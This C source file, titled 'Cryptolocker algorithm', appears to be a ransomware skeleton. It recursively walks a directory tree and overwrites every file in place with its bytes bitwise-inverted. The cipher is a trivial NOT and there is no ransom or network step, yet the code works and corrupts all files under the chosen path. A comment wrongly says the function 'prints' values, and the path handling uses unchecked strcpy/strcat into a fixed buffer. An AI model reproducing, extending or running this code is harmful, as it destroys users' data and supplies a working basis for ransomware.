/*
 * Title  : Cryptolocker algorithm
 * Date   : 09 February 2023
 * Author : https://github.com/ch4rp/
 */

#include <sys/stat.h>
#include <errno.h>
#include <dirent.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#define SIZE			1024
#define MAX_PATH_LENG	1024

void encryption(char *);
int readandwrite(const char *);
int tree(const char *);

int main(void)
{
	const char *startpath = "change me";
	tree(startpath);

	return 0;
}

void encryption(char *pch)
{
	// I wrote it as an example. It just prints the reverse of the value in the address it receives.
    // A more complex encryption algorithm that operates on bytes can be written.
	*pch = ~(*pch);
}

// file operations
int readandwrite(const char *path)
{
	FILE *fs, *tmp;
	unsigned int n, i;
	unsigned char buf[SIZE];

	if ((fs = fopen(path, "r+b")) == NULL)
		return 1;

	if ((tmp = tmpfile()) == NULL)
		return 1;

	while ((n = fread(buf, 1, SIZE, fs)) > 0) 
		fwrite(buf, 1, n, tmp);

	fseek(fs , 0L, SEEK_SET);
	fseek(tmp, 0L, SEEK_SET);

	while ((n = fread(buf, 1, SIZE, tmp)) > 0) {
		for (i = 0; i < n; ++i)
			encryption(buf + i);

		fwrite(buf, 1, n, fs);
	}

	fclose(fs );
	fclose(tmp);

	return 0;
}

// cf. https://github.com/ch4rp/filetree
int tree(const char *path)
{
	DIR *currdir;
	struct dirent *direnv;
	struct stat    envinf;
	char filepath[MAX_PATH_LENG];
	
	if ((currdir = opendir(path)) == NULL)
		return 1;

	while (errno = 0, (direnv = readdir(currdir)) != NULL) {
		if (!strcmp(direnv->d_name, ".") || !strcmp(direnv->d_name, ".."))
			continue;

		memset(filepath, 0, MAX_PATH_LENG);
		strcpy(filepath, path);
		strcat(filepath, "/");
		strcat(filepath, direnv->d_name);

		if (stat(filepath, &envinf) < 0) 
			continue;
		
		if (envinf.st_mode & S_IFDIR) {
			tree(filepath);
			continue;
		}

		readandwrite(filepath);
	}

	if (errno != 0)
		return errno;

	closedir(currdir);

	return 0;
}


